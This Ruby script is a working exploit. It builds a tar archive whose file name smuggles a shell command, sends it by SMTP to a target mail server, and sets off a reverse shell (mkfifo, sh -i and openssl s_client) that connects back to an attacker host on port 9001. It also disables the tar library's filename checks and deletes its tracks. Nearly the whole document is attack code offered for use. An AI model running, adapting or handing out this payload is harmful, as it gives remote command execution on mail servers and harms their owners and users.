require 'base64'
require 'mail'
require 'net/smtp'
require 'rubygems/package'

RHOST = "#{ARGV[0] || '192.168.1.42'}"
LHOST = "192.168.1.10"
LPORT = "9001"

TARGET_EMAIL = "test@lol.tst"

CMD = "setsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect #{LHOST}:#{LPORT} >/tmp/p 2>/dev/null;rm /tmp/p\""
PAYLOAD = "'`#{CMD}`'"

class Gem::Package::TarWriter
=begin
Override split_name to eliminate filename size checks. Prefix names
andfile names are validated in the original code and we want to get
rid of that because we're making sketchy tarfiles here.

https://github.com/ruby/ruby/blob/master/lib/rubygems/package/tar_writer.rb
=end

    def split_name(name)
         prefix = ""
        if name.bytesize > 100
          parts = name.split("/", -1) # parts are never empty here
          name = parts.pop            # initially empty for names with a trailing slash ("foo/.../bar/")
          prefix = parts.join("/")    # if empty, then it's impossible to split (parts is empty too)
          while !parts.empty? && (prefix.bytesize > 155 || name.empty?)
            name = parts.pop + "/" + name
            prefix = parts.join("/")
          end
        end
        [name, prefix]
    end
end

def rand_str(number)
    charset = Array('A'..'Z') + Array('a'..'z')
    Array.new(number) { charset.sample }.join
end

def tar(files_and_contents, output_file)
    puts "[+] Creating tar file: #{output_file}"
    File.open(output_file, "wb") do |file|
        Gem::Package::TarWriter.new(file) do |tar|
            files_and_contents.each_pair do |filename, content|
                tar.add_file_simple(filename, 0644, content.length) do |io|
                    io.write(content)
                end
            end
        end
    end
end

def cleanup(filename)
    puts "[+] cleaning up"
    File.delete(filename) if File.exists?(filename)
end

def sendmail(addr, target_email, attachment)
    src_addr = rand_str(8)
    Mail.defaults do
        delivery_method :smtp, {
            :address => addr,
            :port => 25,
            :openssl_verify_mode => 'none'
        }
    end
    puts "[+] sending mail"
    Mail.deliver do
      from      "#{src_addr}@lol.tst"
      to        target_email # "test@lol.tst"
      subject   "Email with attachment - #{src_addr}"
      body      "Hello world"
      add_file  attachment
    end
end

files = {
    PAYLOAD => rand_str(32),
}

OUTFILE = rand_str(8) + '.tar'

tar(files, OUTFILE)
sendmail(RHOST, TARGET_EMAIL, OUTFILE)
cleanup(OUTFILE)